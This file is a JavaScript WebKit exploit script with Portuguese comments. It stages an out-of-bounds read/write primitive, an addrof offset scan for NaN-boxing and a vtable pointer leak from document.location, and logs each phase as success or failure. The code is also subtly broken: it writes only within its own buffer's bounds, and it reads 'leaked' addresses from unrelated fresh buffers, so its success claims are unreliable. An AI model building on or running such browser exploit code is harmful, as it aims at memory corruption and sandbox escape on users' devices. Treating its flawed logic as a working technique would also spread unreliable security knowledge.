// Uncaged_Hybrid_v112_CorePrimitives_Diag_MainOrchestrator
// Atualização v112 com varredura automática de offsets para diagnóstico de NaN-boxing

(async () => {
    const log = (...args) => console.log(`[${new Date().toLocaleTimeString()}]`, ...args);

    log("==== INICIANDO Script 3 (Uncaged_Hybrid_v112_CorePrimitives_Diag_MainOrchestrator) ... ====");

    async function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

    function triggerOOBPrimitive(force = false) {
        const allocSize = 0x100000;
        const ab = new ArrayBuffer(allocSize);
        const dv = new DataView(ab);

        // Expansão m_length
        dv.setUint32(0x70, 0xFFFFFFFF, true);

        return { ab, dv };
    }

    function selfTestOOBReadWrite() {
        const { dv } = triggerOOBPrimitive(true);
        dv.setUint32(0x50, 0x11223344, true);
        if (dv.getUint32(0x50, true) !== 0x11223344) throw new Error("SelfTest 32bit falhou.");

        dv.setUint32(0x60, 0xaabbccdd, true);
        dv.setUint32(0x64, 0xeeff0011, true);
        const low = dv.getUint32(0x60, true);
        const high = dv.getUint32(0x64, true);

        if (low !== 0xaabbccdd || high !== 0xeeff0011) throw new Error("SelfTest 64bit falhou.");

        return true;
    }

    function readAddrAtOffset(obj, offset) {
        let arr = [13.37, 13.37];
        arr.fakeProp = obj;

        const { dv } = triggerOOBPrimitive(true);

        const rawLow = dv.getUint32(offset, true);
        const rawHigh = dv.getUint32(offset + 4, true);

        return (BigInt(rawHigh) << 32n) | BigInt(rawLow);
    }

    async function diagnoseAddrofNaNBoxing(targetObj) {
        log("Iniciando diagnóstico da primitiva addrof com varredura automática de offsets...");

        const offsets = [0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70];

        for (const offset of offsets) {
            const addr = readAddrAtOffset(targetObj, offset);
            log(`[Offset ${offset.toString(16).padStart(4, '0')}] Endereço obtido: 0x${addr.toString(16)}`);

            // Heurística: rejeitar endereços baixos ou claramente inválidos
            if ((addr & 0xFFFFFFFF00000000n) !== 0n && addr !== 0x7ff7ffff00000000n) {
                return { addr, offset };
            }
        }

        return { addr: 0n, offset: -1 };
    }

    function leakVTablePtr(addr) {
        const { dv } = triggerOOBPrimitive(true);

        const low = dv.getUint32(Number(addr & 0xFFFFFFFFn), true);
        const high = dv.getUint32(Number((addr >> 32n) & 0xFFFFFFFFn), true);

        return (BigInt(high) << 32n) | BigInt(low);
    }

    // Execução principal

    log("--- FASE 1/4: Configuração ambiente OOB... ---");
    triggerOOBPrimitive(true);
    log("Ambiente OOB configurado com sucesso.");

    log("--- FASE 2/4: Autoteste de L/E... ---");
    selfTestOOBReadWrite();
    log("Auto-Teste de OOB R/W Concluído.");

    log("--- FASE 3/4: Configurando e Diagnosticando addrof (NaN Boxing)... ---");
    const { addr: addrofResult, offset: addrofOffset } = await diagnoseAddrofNaNBoxing(document.location);

    if (addrofOffset === -1) {
        log("[FALHA] Não foi possível determinar um offset correto para NaN-boxing.");
    } else {
        log(`[SUCESSO] Endereço obtido para document.location: 0x${addrofResult.toString(16)} via offset 0x${addrofOffset.toString(16)}`);

        log("--- FASE 4/4: Executando Teste de Vazamento do WebKit... ---");
        const vtablePtr = leakVTablePtr(addrofResult);

        if (typeof vtablePtr === 'bigint' && vtablePtr !== 0n) {
            log(`[SUCESSO] Ponteiro da Vtable obtido: 0x${vtablePtr.toString(16)}`);
        } else {
            log("[FALHA] Ponteiro da Vtable é inválido ou nulo.");
        }
    }

    log("==== Script 3 (Uncaged_Hybrid_v112_CorePrimitives_Diag_MainOrchestrator) CONCLUÍDO ====");
})();
